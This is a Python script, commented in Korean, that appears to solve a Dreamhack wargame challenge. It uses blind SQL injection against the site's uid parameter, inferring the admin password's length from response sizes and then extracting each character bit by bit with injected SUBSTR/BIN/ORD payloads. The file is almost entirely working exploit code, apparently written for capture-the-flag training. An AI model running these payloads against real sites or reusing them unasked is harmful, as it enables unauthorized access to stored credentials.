###참고###
#string.ascii_letters: 영어 알파벳 소문자, 대문자 모두를 출력
#string.digits: 십진수 0 ~ 9 까지 출력
#string.punctuation: 특수 문자 출력
#target_chr = string.ascii_letters + string.digits + string.punctuation
import requests, string

#GET 방식으로 동작
target_url = f"http://host3.dreamhack.games:24109/"

#패스워드 길이 초기화
upw_len = 1

#패스워드가 아닐 경우의 Content-Length 길이 저장
#Content-Length의 동작이 다를 경우 패스워드 길이로 유추
#여기서는 패스워드 아닌 값 [214-215], 패스워드 동작 값 -
content_len = ""

#사용자 패스워드 길이
while(1):
    print(f"upw_len: {upw_len}")
    payload = f"admin' AND LENGTH(upw) ={upw_len}#"
    param = {
        #http://host3.dreamhack.games:10005/?uid=
        'uid':payload,
    }
    response = requests.get(target_url, params=param)
    if upw_len == 1:
        content_len = response.headers["Content-Length"]
        content_length_int = int(content_len)
        content_margin = content_length_int + 10
        content_len = str(content_margin)
        
        print(f"Content-Length: {content_len}")
        upw_len += 1
        continue
    
    #Content-Length 비교를 위한 변수
    content_com = response.headers["Content-Length"]
    
    if int(content_len) < int(content_com):
        break
    else:
        upw_len += 1

print(f"[*]upw_len: {upw_len}")

password="" #패스워드 값

def convert_bits_to_korean(bits):
    korean_char_code_list = []
    
    for i in range(0, len(bits), 8):
        byte_bits = bits[i:i+8]
        
        if byte_bits == "00000000":
            break
        
        char_code_decimal = int(byte_bits, 2)
    
        # UTF-8 디코딩을 통해 한글 문자 얻기(Big Endian 형태의 문자)
        # 최종적으로 utf-8 로 decode.
        korean_char_code_list.append(char_code_decimal)

    korean_text_bytes=bytes(korean_char_code_list)

    return korean_text_bytes.decode('utf-8')

for i in range(1, upw_len+1):
    bit_length=0 

    while(True):
        bit_length += 1 
        payload= f"admin' and LENGTH(bin(ord(substr(upw,{i},1))))={bit_length}; --"
        param={
            'uid': payload
        }

        response=requests.get(target_url,params=param)

        if 'exists' in response.text:
            break

    print(f"{i}번째 pwd(문자 비트): {bit_length}")

    bits=""
    for j in range(1, bit_length+1):

        payload=f"admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)='1'; -- "
        param={
            'uid': payload
        }

        response=requests.get(target_url,params=param)

        if 'exists' in response.text:
            bits+='1'
        else:
            bits+='0'

    print(f"-> {bits}")

    password+=convert_bits_to_korean(bits)

print("Password:", password)